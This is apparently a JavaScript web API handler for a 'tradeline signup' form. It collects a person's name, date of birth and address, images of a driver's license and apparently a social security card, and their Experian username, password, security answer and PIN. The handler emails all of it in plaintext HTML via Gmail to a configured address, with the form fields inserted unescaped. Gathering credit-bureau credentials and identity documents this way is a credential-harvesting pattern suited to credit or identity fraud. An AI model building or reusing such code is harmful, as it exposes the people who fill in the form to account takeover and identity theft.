import nodemailer from "nodemailer";
import formidable from "formidable";
import fs from "fs";

export const config = {
  api: {
    bodyParser: false,
  },
};

export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).send("Method Not Allowed");
  }

  const form = formidable({
    multiples: false,
    keepExtensions: true,
  });

  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error(err);
      return res.status(500).send("Form parsing error");
    }

    try {
      const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
          user: process.env.GMAIL_USER,
          pass: process.env.GMAIL_PASS,
        },
      });

      const attachments = [];

      if (files.drivers_license_upload) {
        attachments.push({
          filename: files.drivers_license_upload.originalFilename,
          path: files.drivers_license_upload.filepath,
        });
      }

      if (files.ssc_upload) {
        attachments.push({
          filename: files.ssc_upload.originalFilename,
          path: files.ssc_upload.filepath,
        });
      }

      const mailOptions = {
        from: process.env.GMAIL_USER,
        to: process.env.TO,
        subject: "New Tradeline Signup Submission",
        html: `
          <h2>New Tradeline Signup</h2>

          <p><strong>Name:</strong> ${fields.first_name} ${fields.last_name}</p>
          <p><strong>Email:</strong> ${fields.email}</p>
          <p><strong>Phone:</strong> ${fields.phone}</p>
          <p><strong>DOB:</strong> ${fields.date_of_birth}</p>

          <hr/>

          <h3>Address</h3>
          <p>${fields.address}</p>
          <p>${fields.city}, ${fields.state} ${fields.zip_code}</p>

          <hr/>

          <h3>Experian Information</h3>
          <p><strong>Username:</strong> ${fields.experian_username}</p>
          <p><strong>Password:</strong> ${fields.experian_password}</p>
          <p><strong>Security Answer:</strong> ${fields.experian_security_answer}</p>
          <p><strong>4 Digit PIN:</strong> ${fields.experian_pin}</p>

          <hr/>

          <h3>Agreement</h3>
          <p>No Refunds Agreed: ${fields.agree_no_refunds ? "Yes" : "No"}</p>
          <p>Security Freezes Responsibility: ${fields.agree_security_freezes ? "Yes" : "No"}</p>
        `,
        attachments,
      };

      await transporter.sendMail(mailOptions);

      // Clean up temp uploaded files
      attachments.forEach(file => {
        if (file.path && fs.existsSync(file.path)) {
          fs.unlinkSync(file.path);
        }
      });

      // Redirect after success
      res.writeHead(302, {
        Location: "https://bisque-ram-411182.hostingersite.com/thank-you",
      });
      res.end();

    } catch (error) {
      console.error(error);
      res.status(500).send("Email sending failed");
    }
  });
}